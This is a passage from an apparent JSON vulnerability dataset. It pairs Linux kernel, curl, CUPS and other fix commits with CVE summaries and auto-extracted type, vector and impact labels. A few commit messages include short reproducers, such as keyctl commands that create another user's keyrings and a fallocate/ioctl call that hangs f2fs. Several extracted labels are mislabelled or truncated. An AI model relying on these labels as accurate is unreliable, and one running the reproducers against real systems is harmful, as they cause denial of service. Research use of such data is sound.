feature\n\nCommit cd63f3c (\"powerpc\/tm: Fix saving of TM SPRs in core dump\")\nadded code to access TM SPRs in flush_tmregs_to_thread(). However\nflush_tmregs_to_thread() does not check if TM feature is available on\nCPU before trying to access TM SPRs in order to copy live state to\nthread structures. flush_tmregs_to_thread() is indeed guarded by\nCONFIG_PPC_TRANSACTIONAL_MEM but it might be the case that kernel\nwas compiled with CONFIG_PPC_TRANSACTIONAL_MEM enabled and ran on\na CPU without TM feature available, thus rendering the execution\nof TM instructions that are treated by the CPU as illegal instructions.\n\nThe fix is just to add proper checking in flush_tmregs_to_thread()\nif CPU has the TM feature before accessing any TM-specific resource,\nreturning immediately if TM is no available on the CPU. Adding\nthat checking in flush_tmregs_to_thread() instead of in places\nwhere it is called, like in vsr_get() and vsr_set(), is better because\navoids the same problem cropping up elsewhere.\n\nCc: stable@vger.kernel.org # v4.13+\nFixes: cd63f3c (\"powerpc\/tm: Fix saving of TM SPRs in core dump\")\nSigned-off-by: Gustavo Romero <gromero@linux.vnet.ibm.com>\nReviewed-by: Cyril Bur <cyrilbur@gmail.com>\nSigned-off-by: Michael Ellerman <mpe@ellerman.id.au>","summary":"In the flush_tmregs_to_thread function in arch\/powerpc\/kernel\/ptrace.c in the Linux kernel before 4.13.5, a guest kernel crash can be triggered from unprivileged userspace during a core dump on a POWER host due to a missing processor feature check and an erroneous use of transactional memory (TM) instructions in the core dump path, leading to a denial of service.","commit_message_1":"flush tm only if cpu ha tm feature commit cd63f3c ( `` powerpc\/tm : fix saving of tm sprs in core dump '' ) added code to access tm sprs in flush_tmregs_to_thread ( )","Vulnerability Type":"buffer overflow","Attack Vector":"during a core dump on a POWER host due to a missing processor feature check and an erroneous use of transactional memory (TM) instructions in the core dump path","Impact":"cause a denial of service","Root Cause":"caused by a missing processor feature check","Attack Type":"local attacker"},{"commit_id":"b71812168571fa55e44cdd0254471331b9c4c4c6","cve_id":"CVE-2018-1068","cwe_id":"CWE-787","commit_message":"netfilter: ebtables: CONFIG_COMPAT: don't trust userland offsets\n\nWe need to make sure the offsets are not out of range of the\ntotal size.\nAlso check that they are in ascending order.\n\nThe WARN_ON triggered by syzkaller (it sets panic_on_warn) is\nchanged to also bail out, no point in continuing parsing.\n\nBriefly tested with simple ruleset of\n-A INPUT --limit 1\/s' --log\nplus jump to custom chains using 32bit ebtables binary.\n\nReported-by: <syzbot+845a53d13171abf8bf29@syzkaller.appspotmail.com>\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"A flaw was found in the Linux 4.x kernel's implementation of 32-bit syscall interface for bridging. This allowed a privileged user to arbitrarily write to a limited range of kernel memory.","commit_message_1":"ebtables : config_compat : do n't trust userland offset we need to make sure the offset are not out of range of the total size","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"arbitrarily write","Impact":"gain elevated privileges","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"cabfb3680f78981d26c078a26e5c748531257ebb","cve_id":"CVE-2018-1066","cwe_id":"CWE-476","commit_message":"CIFS: Enable encryption during session setup phase\n\nIn order to allow encryption on SMB connection we need to exchange\na session key and generate encryption and decryption keys.\n\nSigned-off-by: Pavel Shilovsky <pshilov@microsoft.com>","summary":"The Linux kernel before version 4.11 is vulnerable to a NULL pointer dereference in fs\/cifs\/cifsencrypt.c:setup_ntlmv2_rsp() that allows an attacker controlling a CIFS server to kernel panic a client that has this server mounted, because an empty TargetInfo field in an NTLMSSP setup negotiation response is mishandled during session recovery.","commit_message_1":"enable encryption during session setup phase in order to allow encryption on smb connection we need to exchange a session key and generate encryption and decryption key","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"controlling a CIFS server","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"attacker"},{"commit_id":"57ebd808a97d7c5b1e1afb937c2db22beba3c1f8","cve_id":"CVE-2018-1065","cwe_id":"CWE-476","commit_message":"netfilter: add back stackpointer size checks\n\nThe rationale for removing the check is only correct for rulesets\ngenerated by ip(6)tables.\n\nIn iptables, a jump can only occur to a user-defined chain, i.e.\nbecause we size the stack based on number of user-defined chains we\ncannot exceed stack size.\n\nHowever, the underlying binary format has no such restriction,\nand the validation step only ensures that the jump target is a\nvalid rule start point.\n\nIOW, its possible to build a rule blob that has no user-defined\nchains but does contain a jump.\n\nIf this happens, no jump stack gets allocated and crash occurs\nbecause no jumpstack was allocated.\n\nFixes: 7814b6ec6d0d6 (\"netfilter: xtables: don't save\/restore jumpstack offset\")\nReported-by: syzbot+e783f671527912cd9403@syzkaller.appspotmail.com\nSigned-off-by: Florian Westphal <fw@strlen.de>\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>","summary":"The netfilter subsystem in the Linux kernel through 4.15.7 mishandles the case of a rule blob that contains a jump but lacks a user-defined chain, which allows local users to cause a denial of service (NULL pointer dereference) by leveraging the CAP_NET_RAW or CAP_NET_ADMIN capability, related to arpt_do_table in net\/ipv4\/netfilter\/arp_tables.c, ipt_do_table in net\/ipv4\/netfilter\/ip_tables.c, and ip6t_do_table in net\/ipv6\/netfilter\/ip6_tables.c.","commit_message_1":"add back stackpointer size check the rationale for removing the check is only correct for rulesets generated by ip ( <number> ) table","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by leveraging the cap _ net _ raw or cap _ net _ admin capability , related to arpt _ do _ table in net \/ ipv4 \/ netfilter \/ arp _ tables . c , ipt","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"contains a jump but lacks a user - defined chain ,","Attack Type":"local attacker"},{"commit_id":"ba1dbd78e5f1ed67c1b8d37ac89d90e5e330b628","cve_id":"CVE-2018-0500","cwe_id":"CWE-119","commit_message":"smtp: use the upload buffer size for scratch buffer malloc\n\n... not the read buffer size, as that can be set smaller and thus cause\na buffer overflow! CVE-2018-0500\n\nReported-by: Peter Wu\nBug: https:\/\/curl.haxx.se\/docs\/adv_2018-70a2.html","summary":"Curl_smtp_escape_eob in lib\/smtp.c in curl 7.54.1 to and including curl 7.60.0 has a heap-based buffer overflow that might be exploitable by an attacker who can control the data that curl transmits over SMTP with certain settings (i.e., use of a nonstandard --limit-rate argument or CURLOPT_BUFFERSIZE value).","commit_message_1":"use the upload buffer size for scratch buffer malloc","Vulnerability Type":"buffer overflow","Attack Vector":"By sending specially-crafted arguments","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"has a heap - based buffer overflow that might be exploitable","Attack Type":"remote attacker"},{"commit_id":"18de8f9f0762c3a542b1122589edb8af859d9813","cve_id":"CVE-2018-0429","cwe_id":"CWE-119","commit_message":"Fix possible stack overflows in decoder for illegal bit streams\n\nFixes CVE-2018-0429\nA vulnerability in the Thor decoder (available at:\nhttps:\/\/github.com\/cisco\/thor) could allow an authenticated, local\nattacker to cause segmentation faults and stack overflows when using a\nnon-conformant Thor bitstream as input.\nThe vulnerability is due to lack of input validation when parsing the\nbitstream. A successful exploit could allow the attacker to cause a\nstack overflow and potentially inject and execute arbitrary code.","summary":"Stack-based buffer overflow in the Cisco Thor decoder before commit 18de8f9f0762c3a542b1122589edb8af859d9813 allows local users to cause a denial of service (segmentation fault) and execute arbitrary code via a crafted non-conformant Thor bitstream.","commit_message_1":"fix possible stack overflow in decoder for illegal bit stream fix <cve_id> a vulnerability in the thor decoder ( available at : http : \/\/<file>\/cisco\/thor ) could allow an authenticated , local attacker to cause segmentation fault and stack overflow when using a non-conformant thor bitstream a input","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted non-conformant","Impact":"cause a denial of service","Root Cause":"a stack-based buffer overflow","Attack Type":"local attacker"},{"commit_id":"7aeb624b44f86d335841242ff427433190e7168a","cve_id":"CVE-2017-1000494","cwe_id":"CWE-119","commit_message":"properly initialize data structure for SOAP parsing in ParseNameValue()\n\ntopelt field was not properly initialized.\n\nshould fix #268","summary":"Uninitialized stack variable vulnerability in NameValueParserEndElt (upnpreplyparse.c) in miniupnpd < 2.0 allows an attacker to cause Denial of Service (Segmentation fault and Memory Corruption) or possibly have unspecified other impact","commit_message_1":"properly initialize data structure for soap parsing in parsenamevalue ( ) topelt field wa not properly initialized","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"cause denial of service ( segmentation fault and memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by an uninitialized stack variable flaw","Attack Type":"remote attacker"},{"commit_id":"6c0f101a62489b1c5927b4ed63b0e1d37db40282","cve_id":"CVE-2017-1000458","cwe_id":"CWE-787","commit_message":"Patch OOB write in content-line analyzer.\n\nA combination of packets can trigger an out of bound write of '0' byte\nin the content-line analyzer.\n\nThis bug was found by Frank Meier.\n\nAddresses BIT-1856.","summary":"Bro before Bro v2.5.2 is vulnerable to an out of bounds write in the ContentLine analyzer allowing remote attackers to cause a denial of service (crash) and possibly other exploitation.","commit_message_1":"patch oob write in content-line analyzer","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service ( crash ) and possibly other exploitation .","Root Cause":"caused by an out of bounds write","Attack Type":"remote attacker"},{"commit_id":"814f31d8eceda8401eb812fc2e94ed143fdad0ab","cve_id":"CVE-2017-1000418","cwe_id":"CWE-119","commit_message":"wildmidi_lib.c (WildMidi_Open, WildMidi_OpenBuffer): refuse to proceed if less then 18 bytes of input\n\nFixes bug #178.","summary":"The WildMidi_Open function in WildMIDI since commit d8a466829c67cacbb1700beded25c448d99514e5 allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.","commit_message_1":"refuse to proceed if le then <number> byte of input fix bug # <number>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service ( heap - based buffer overflow and application crash ) or possibly have","Root Cause":"caused by a heap-based buffer overflow","Attack Type":"remote attacker"},{"commit_id":"b4e458612d4294e0cfe01dbf1c0b09a07a8133a4#diff-cf9182aecc9d630e8db2e0e35f1eec65","cve_id":"CVE-2017-1000414","cwe_id":"CWE-369","commit_message":"Fixed div0 vulnerability in SampFact","summary":"ImpulseAdventure JPEGsnoop version 1.7.5 is vulnerable to a division by zero in the JFIF decode handling resulting denial of service.","commit_message_1":"fixed div0 vulnerability in sampfact","Vulnerability Type":"Divide By Zero","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a division by zero flaw","Attack Type":"remote attacker"},{"commit_id":"cef31d9af908243421258f1df35a4a644604efbe","cve_id":"CVE-2017-18344","cwe_id":"CWE-125","commit_message":"posix-timer: Properly check sigevent->sigev_notify\n\ntimer_create() specifies via sigevent->sigev_notify the signal delivery for\nthe new timer. The valid modes are SIGEV_NONE, SIGEV_SIGNAL, SIGEV_THREAD\nand (SIGEV_SIGNAL | SIGEV_THREAD_ID).\n\nThe sanity check in good_sigevent() is only checking the valid combination\nfor the SIGEV_THREAD_ID bit, i.e. SIGEV_SIGNAL, but if SIGEV_THREAD_ID is\nnot set it accepts any random value.\n\nThis has no real effects on the posix timer and signal delivery code, but\nit affects show_timer() which handles the output of \/proc\/$PID\/timers. That\nfunction uses a string array to pretty print sigev_notify. The access to\nthat array has no bound checks, so random sigev_notify cause access beyond\nthe array bounds.\n\nAdd proper checks for the valid notify modes and remove the SIGEV_THREAD_ID\nmasking from various code pathes as SIGEV_NONE can never be set in\ncombination with SIGEV_THREAD_ID.\n\nReported-by: Eric Biggers <ebiggers3@gmail.com>\nReported-by: Dmitry Vyukov <dvyukov@google.com>\nReported-by: Alexey Dobriyan <adobriyan@gmail.com>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nCc: John Stultz <john.stultz@linaro.org>\nCc: stable@vger.kernel.org","summary":"The timer_create syscall implementation in kernel\/time\/posix-timers.c in the Linux kernel before 4.14.8 doesn't properly validate the sigevent->sigev_notify field, which leads to out-of-bounds access in the show_timer function (called when \/proc\/$PID\/timers is read). This allows userspace applications to read arbitrary kernel memory (on a kernel built with CONFIG_POSIX_TIMERS and CONFIG_CHECKPOINT_RESTORE).","commit_message_1":"properly check sigevent- > sigev_notify timer_create ( ) specifies via sigevent- > sigev_notify the signal delivery for the new timer","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"The timer_create syscall implementation in kernel\/time\/posix-timers.c in the Linux kernel","Impact":"read arbitrary kernel memory ( on a kernel built with config _ po","Root Cause":"doesn ' t properly validate the sigevent - > sigev _ notify field , which leads to out - of - bounds","Attack Type":"local attacker"},{"commit_id":"237bbd29f7a049d310d907f4b2716a7feef9abf3","cve_id":"CVE-2017-18270","cwe_id":null,"commit_message":"KEYS: prevent creating a different user's keyrings\n\nIt was possible for an unprivileged user to create the user and user\nsession keyrings for another user.  For example:\n\n    sudo -u '#3000' sh -c 'keyctl add keyring _uid.4000 \"\" @u\n                           keyctl add keyring _uid_ses.4000 \"\" @u\n                           sleep 15' &\n    sleep 1\n    sudo -u '#4000' keyctl describe @u\n    sudo -u '#4000' keyctl describe @us\n\nThis is problematic because these \"fake\" keyrings won't have the right\npermissions.  In particular, the user who created them first will own\nthem and will have full access to them via the possessor permissions,\nwhich can be used to compromise the security of a user's keys:\n\n    -4: alswrv-----v------------  3000     0 keyring: _uid.4000\n    -5: alswrv-----v------------  3000     0 keyring: _uid_ses.4000\n\nFix it by marking user and user session keyrings with a flag\nKEY_FLAG_UID_KEYRING.  Then, when searching for a user or user session\nkeyring by name, skip all keyrings that don't have the flag set.\n\nFixes: 69664cf16af4 (\"keys: don't generate user and user session keyrings unless they're accessed\")\nCc: <stable@vger.kernel.org>\t[v2.6.26+]\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nSigned-off-by: David Howells <dhowells@redhat.com>","summary":"In the Linux kernel before 4.13.5, a local user could create keyrings for other users via keyctl commands, setting unwanted defaults or causing a denial of service.","commit_message_1":"prevent creating a different user 's keyrings it wa possible for an unprivileged user to create the user and user session keyrings for another user","Vulnerability Type":"unspecified","Attack Vector":"By using keyctl commands","Impact":"cause a denial of service","Root Cause":"create keyrings for other users via keyct","Attack Type":"local attacker"},{"commit_id":"b86e33075ed1909d8002745b56ecf73b833db143","cve_id":"CVE-2017-18257","cwe_id":"CWE-190","commit_message":"f2fs: fix a dead loop in f2fs_fiemap()\n\nA dead loop can be triggered in f2fs_fiemap() using the test case\nas below:\n\n\t...\n\tfd = open();\n\tfallocate(fd, 0, 0, 4294967296);\n\tioctl(fd, FS_IOC_FIEMAP, fiemap_buf);\n\t...\n\nIt's caused by an overflow in __get_data_block():\n\t...\n\tbh->b_size = map.m_len << inode->i_blkbits;\n\t...\nmap.m_len is an unsigned int, and bh->b_size is a size_t which is 64 bits\non 64 bits archtecture, type conversion from an unsigned int to a size_t\nwill result in an overflow.\n\nIn the above-mentioned case, bh->b_size will be zero, and f2fs_fiemap()\nwill call get_data_block() at block 0 again an again.\n\nFix this by adding a force conversion before left shift.\n\nSigned-off-by: Wei Fang <fangwei1@huawei.com>\nAcked-by: Chao Yu <yuchao0@huawei.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"The __get_data_block function in fs\/f2fs\/data.c in the Linux kernel before 4.11 allows local users to cause a denial of service (integer overflow and loop) via crafted use of the open and fallocate system calls with an FS_IOC_FIEMAP ioctl.","commit_message_1":"fix a dead loop in f2fs_fiemap ( ) a dead loop can be triggered in f2fs_fiemap ( ) using the test case a below :","Vulnerability Type":"integer overflow","Attack Vector":"via crafted use of the open and fallocate system calls with an fs _ ioc _ fiemap ioctl","Impact":"cause a denial of service ( integer overflow and loop )","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"1572e45a924f254d9570093abde46430c3172e3d","cve_id":"CVE-2017-18255","cwe_id":"CWE-190","commit_message":"perf\/core: Fix the perf_cpu_time_max_percent check\n\nUse \"proc_dointvec_minmax\" instead of \"proc_dointvec\" to check the input\nvalue from user-space.\n\nIf not, we can set a big value and some vars will overflow like\n\"sysctl_perf_event_sample_rate\" which will cause a lot of unexpected\nproblems.\n\nSigned-off-by: Tan Xiaojun <tanxiaojun@huawei.com>\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nCc: <acme@kernel.org>\nCc: <alexander.shishkin@linux.intel.com>\nCc: Alexander Shishkin <alexander.shishkin@linux.intel.com>\nCc: Arnaldo Carvalho de Melo <acme@redhat.com>\nCc: Jiri Olsa <jolsa@redhat.com>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Stephane Eranian <eranian@google.com>\nCc: Thomas Gleixner <tglx@linutronix.de>\nCc: Vince Weaver <vincent.weaver@maine.edu>\nLink: http:\/\/lkml.kernel.org\/r\/1487829879-56237-1-git-send-email-tanxiaojun@huawei.com\nSigned-off-by: Ingo Molnar <mingo@kernel.org>","summary":"The perf_cpu_time_max_percent_handler function in kernel\/events\/core.c in the Linux kernel before 4.11 allows local users to cause a denial of service (integer overflow) or possibly have unspecified other impact via a large value, as demonstrated by an incorrect sample-rate calculation.","commit_message_1":"fix the perf_cpu_time_max_percent check use `` proc_dointvec_minmax '' instead of `` proc_dointvec '' to check the input value from user-space","Vulnerability Type":"integer overflow","Attack Vector":"via a large value , as demonstrated by an incorrect sample - rate calculation","Impact":"cause a denial of service ( integer overflow ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"30a61ddf8117c26ac5b295e1233eaa9629a94ca3","cve_id":"CVE-2017-18249","cwe_id":"CWE-362","commit_message":"f2fs: fix race condition in between free nid allocator\/initializer\n\nIn below concurrent case, allocated nid can be loaded into free nid cache\nand be allocated again.\n\nThread A\t\t\t\tThread B\n- f2fs_create\n - f2fs_new_inode\n  - alloc_nid\n   - __insert_nid_to_list(ALLOC_NID_LIST)\n\t\t\t\t\t- f2fs_balance_fs_bg\n\t\t\t\t\t - build_free_nids\n\t\t\t\t\t  - __build_free_nids\n\t\t\t\t\t   - scan_nat_page\n\t\t\t\t\t    - add_free_nid\n\t\t\t\t\t     - __lookup_nat_cache\n - f2fs_add_link\n  - init_inode_metadata\n   - new_inode_page\n    - new_node_page\n     - set_node_addr\n - alloc_nid_done\n  - __remove_nid_from_list(ALLOC_NID_LIST)\n\t\t\t\t\t     - __insert_nid_to_list(FREE_NID_LIST)\n\nThis patch makes nat cache lookup and free nid list operation being atomical\nto avoid this race condition.\n\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>\nSigned-off-by: Chao Yu <yuchao0@huawei.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"The add_free_nid function in fs\/f2fs\/node.c in the Linux kernel before 4.12 does not properly track an allocated nid, which allows local users to cause a denial of service (race condition) or possibly have unspecified other impact via concurrent threads.","commit_message_1":"fix race condition in between free nid allocator\/initializer in below concurrent case , allocated nid can be loaded into free nid cache and be allocated again","Vulnerability Type":"Race Condition","Attack Vector":"via concurrent threads","Impact":"cause a denial of service ( race condition ) or possibly have unspecified other impact","Root Cause":"does not properly track an allocated nid","Attack Type":"local attacker"},{"commit_id":"49fa4983f25b64ec29d548ffa3b9782426007df3","cve_id":"CVE-2017-18248","cwe_id":"CWE-20","commit_message":"DBUS notifications could crash the scheduler (Issue #5143)\n\n- scheduler\/ipp.c: Make sure requesting-user-name string is valid UTF-8.","summary":"The add_job function in scheduler\/ipp.c in CUPS before 2.2.6, when D-Bus support is enabled, can be crashed by remote attackers by sending print jobs with an invalid username, related to a D-Bus notification.","commit_message_1":"dbus notification could crash the scheduler ( issue # <number> ) - scheduler\/<file> : make sure requesting-user-name string is valid utf-<number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"sending print jobs with an invalid username , related to a d - bus notification .","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"d4fdf8ba0e5808ba9ad6b44337783bd9935e0982","cve_id":"CVE-2017-18241","cwe_id":"CWE-476","commit_message":"f2fs: fix a panic caused by NULL flush_cmd_control\n\nMount fs with option noflush_merge, boot failed for illegal address\nfcc in function f2fs_issue_flush:\n\n        if (!test_opt(sbi, FLUSH_MERGE)) {\n                ret = submit_flush_wait(sbi);\n                atomic_inc(&fcc->issued_flush);   ->  Here, fcc illegal\n                return ret;\n        }\n\nSigned-off-by: Yunlei He <heyunlei@huawei.com>\nSigned-off-by: Jaegeuk Kim <jaegeuk@kernel.org>","summary":"fs\/f2fs\/segment.c in the Linux kernel before 4.13 allows local users to cause a denial of service (NULL pointer dereference and panic) by using a noflush_merge option that triggers a NULL value for a flush_cmd_control data structure.","commit_message_1":"fix a panic caused by null flush_cmd_control mount f with option noflush_merge , boot failed for illegal address fcc in function f2fs_issue_flush : if ( ! test_opt ( sbi , flush_merge ) ) { ret = submit_flush_wait ( sbi ) ; atomic_inc ( & fcc- > issued_flush ) ; - > here , fcc illegal return ret ; }","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by using a noflush _ merge option that triggers a value for a flush _ cmd _ control data structure","Impact":"cause a denial of service ( pointer dereference and panic )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"0558f33c06bb910e2879e355192227a8e8f0219d","cve_id":"CVE-2017-18232","cwe_id":null,"commit_message":"scsi: libsas: direct call probe and destruct\n\nIn commit 87c8331fcf72 (\"[SCSI] libsas: prevent domain rediscovery\ncompeting with ata error handling\") introduced disco mutex to prevent\nrediscovery competing with ata error handling and put the whole\nrevalidation in the mutex. But the rphy add\/remove needs to wait for the\nerror handling which also grabs the disco mutex. This may leads to dead\nlock.So the probe and destruct event were introduce to do the rphy\nadd\/remove asynchronously and out of the lock.\n\nThe asynchronously processed workers makes the whole discovery process\nnot atomic, the other events may interrupt the process. For example,\nif a loss of signal event inserted before the probe event, the\nsas_deform_port() is called and the port will be deleted.\n\nAnd sas_port_delete() may run before the destruct event, but the\nport-x:x is the top parent of end device or expander. This leads to\na kernel WARNING such as:\n\n[   82.042979] sysfs group 'power' not found for kobject 'phy-1:0:22'\n[   82.042983] ------------[ cut here ]------------\n[   82.042986] WARNING: CPU: 54 PID: 1714 at fs\/sysfs\/group.c:237\nsysfs_remove_group+0x94\/0xa0\n[   82.043059] Call trace:\n[   82.043082] [<ffff0000082e7624>] sysfs_remove_group+0x94\/0xa0\n[   82.043085] [<ffff00000864e320>] dpm_sysfs_remove+0x60\/0x70\n[   82.043086] [<ffff00000863ee10>] device_del+0x138\/0x308\n[   82.043089] [<ffff00000869a2d0>] sas_phy_delete+0x38\/0x60\n[   82.043091] [<ffff00000869a86c>] do_sas_phy_delete+0x6c\/0x80\n[   82.043093] [<ffff00000863dc20>] device_for_each_child+0x58\/0xa0\n[   82.043095] [<ffff000008696f80>] sas_remove_children+0x40\/0x50\n[   82.043100] [<ffff00000869d1bc>] sas_destruct_devices+0x64\/0xa0\n[   82.043102] [<ffff0000080e93bc>] process_one_work+0x1fc\/0x4b0\n[   82.043104] [<ffff0000080e96c0>] worker_thread+0x50\/0x490\n[   82.043105] [<ffff0000080f0364>] kthread+0xfc\/0x128\n[   82.043107] [<ffff0000080836c0>] ret_from_fork+0x10\/0x50\n\nMake probe and destruct a direct call in the disco and revalidate function,\nbut put them outside the lock. The whole discovery or revalidate won't\nbe interrupted by other events. And the DISCE_PROBE and DISCE_DESTRUCT\nevent are deleted as a result of the direct call.\n\nIntroduce a new list to destruct the sas_port and put the port delete after\nthe destruct. This makes sure the right order of destroying the sysfs\nkobject and fix the warning above.\n\nIn sas_ex_revalidate_domain() have a loop to find all broadcasted\ndevice, and sometimes we have a chance to find the same expander twice.\nBecause the sas_port will be deleted at the end of the whole revalidate\nprocess, sas_port with the same name cannot be added before this.\nOtherwise the sysfs will complain of creating duplicate filename. Since\nthe LLDD will send broadcast for every device change, we can only\nprocess one expander's revalidation.\n\n[mkp: kbuild test robot warning]\n\nSigned-off-by: Jason Yan <yanaijie@huawei.com>\nCC: John Garry <john.garry@huawei.com>\nCC: Johannes Thumshirn <jthumshirn@suse.de>\nCC: Ewan Milne <emilne@redhat.com>\nCC: Christoph Hellwig <hch@lst.de>\nCC: Tomas Henzl <thenzl@redhat.com>\nCC: Dan Williams <dan.j.williams@intel.com>\nReviewed-by: Hannes Reinecke <hare@suse.com>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>","summary":"The Serial Attached SCSI (SAS) implementation in the Linux kernel through 4.15.9 mishandles a mutex within libsas, which allows local users to cause a denial of service (deadlock) by triggering certain error-handling code.","commit_message_1":"libsas : direct call probe and destruct in commit 87c8331fcf72 ( `` [ scsi ] libsas : prevent domain rediscovery competing with ata error handling '' ) introduced disco mutex to prevent rediscovery competing with ata error handling and put the whole revalidation in the mutex","Vulnerability Type":"deadlock","Attack Vector":"by triggering certain error - handling code","Impact":"cause a denial of service ( deadlock )","Root Cause":"caused by a deadlock","Attack Type":"local attacker"},{"commit_id":"3e4c56d41eef5595035872a2ec5a483f42e8917f","cve_id":"CVE-2017-18224","cwe_id":"CWE-362","commit_message":"ocfs2: ip_alloc_sem should be taken in ocfs2_get_block()\n\nip_alloc_sem should be taken in ocfs2_get_block() when reading file in\nDIRECT mode to prevent concurrent access to extent tree with\nocfs2_dio_end_io_write(), which may cause BUGON in the following\nsituation:\n\nread file 'A'                                  end_io of writing file 'A'\nvfs_read\n __vfs_read\n  ocfs2_file_read_iter\n   generic_file_read_iter\n    ocfs2_direct_IO\n     __blockdev_direct_IO\n      do_blockdev_direct_IO\n       do_direct_IO\n        get_more_blocks\n         ocfs2_get_block\n          ocfs2_extent_map_get_blocks\n           ocfs2_get_clusters\n            ocfs2_get_clusters_nocache()\n             ocfs2_search_extent_list\n              return the index of record which\n              contains the v_cluster, that is\n              v_cluster > rec[i]->e_cpos.\n                                                ocfs2_dio_end_io\n                                                 ocfs2_dio_end_io_write\n                                                  down_write(&oi->ip_alloc_sem);\n                                                  ocfs2_mark_extent_written\n                                                   ocfs2_change_extent_flag\n                                                    ocfs2_split_extent\n                                                     ...\n                                                 --> modify the rec[i]->e_cpos, resulting\n                                                     in v_cluster < rec[i]->e_cpos.\n             BUG_ON(v_cluster < le32_to_cpu(rec->e_cpos))\n\n[alex.chen@huawei.com: v3]\n  Link: http:\/\/lkml.kernel.org\/r\/59EF3614.6050008@huawei.com\nLink: http:\/\/lkml.kernel.org\/r\/59EF3614.6050008@huawei.com\nFixes: c15471f79506 (\"ocfs2: fix sparse file & data ordering issue in direct io\")\nSigned-off-by: Alex Chen <alex.chen@huawei.com>\nReviewed-by: Jun Piao <piaojun@huawei.com>\nReviewed-by: Joseph Qi <jiangqi903@gmail.com>\nReviewed-by: Gang He <ghe@suse.com>\nAcked-by: Changwei Ge <ge.changwei@h3c.com>\nCc: Mark Fasheh <mfasheh@versity.com>\nCc: Joel Becker <jlbec@evilplan.org>\nCc: Junxiao Bi <junxiao.bi@oracle.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"In the Linux kernel before 4.15, fs\/ocfs2\/aops.c omits use of a semaphore and consequently has a race condition for access to the extent tree during read operations in DIRECT mode, which allows local users to cause a denial of service (BUG) by modifying a certain e_cpos field.","commit_message_1":"ip_alloc_sem should be taken in ocfs2_get_block ( ) ip_alloc_sem should be taken in ocfs2_get_block ( ) when reading file in direct mode to prevent concurrent access to extent tree with ocfs2_dio_end_io_write ( ) , which may cause bugon in the following situation : read file ' a ' end_io of writing file ' a ' vfs_read __vfs_read ocfs2_file_read_iter generic_file_read_iter ocfs2_direct_io __blockdev_direct_io do_blockdev_direct_io do_direct_io get_more_blocks ocfs2_get_block ocfs2_extent_map_get_blocks ocfs2_get_clusters ocfs2_get_clusters_nocache ( ) ocfs2_search_extent_list return the index of record which contains the v_cluster , that is v_cluster > rec [ i ] - > e_cpos","Vulnerability Type":"Race Condition","Attack Vector":"by modifying a certain e _ cpos field","Impact":"cause a denial of service ( bug )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"412b65d15a7f8a93794653968308fc100f2aa87c","cve_id":"CVE-2017-18222","cwe_id":"CWE-119","commit_message":"net: hns: fix ethtool_get_strings overflow in hns driver\n\nhns_get_sset_count() returns HNS_NET_STATS_CNT and the data space allocated\nis not enough for ethtool_get_strings(), which will cause random memory\ncorruption.\n\nWhen SLAB and DEBUG_SLAB are both enabled, memory corruptions like the\nthe following can be observed without this patch:\n[   43.115200] Slab corruption (Not tainted): Acpi-ParseExt start=ffff801fb0b69030, len=80\n[   43.115206] Redzone: 0x9f911029d006462\/0x5f78745f31657070.\n[   43.115208] Last user: [<5f7272655f746b70>](0x5f7272655f746b70)\n[   43.115214] 010: 70 70 65 31 5f 74 78 5f 70 6b 74 00 6b 6b 6b 6b  ppe1_tx_pkt.kkkk\n[   43.115217] 030: 70 70 65 31 5f 74 78 5f 70 6b 74 5f 6f 6b 00 6b  ppe1_tx_pkt_ok.k\n[   43.115218] Next obj: start=ffff801fb0b69098, len=80\n[   43.115220] Redzone: 0x706d655f6f666966\/0x9f911029d74e35b.\n[   43.115229] Last user: [<ffff0000084b11b0>](acpi_os_release_object+0x28\/0x38)\n[   43.115231] 000: 74 79 00 6b 6b 6b 6b 6b 70 70 65 31 5f 74 78 5f  ty.kkkkkppe1_tx_\n[   43.115232] 010: 70 6b 74 5f 65 72 72 5f 63 73 75 6d 5f 66 61 69  pkt_err_csum_fai\n\nSigned-off-by: Timmy Li <lixiaoping3@huawei.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"In the Linux kernel before 4.12, Hisilicon Network Subsystem (HNS) does not consider the ETH_SS_PRIV_FLAGS case when retrieving sset_count data, which allows local users to cause a denial of service (buffer 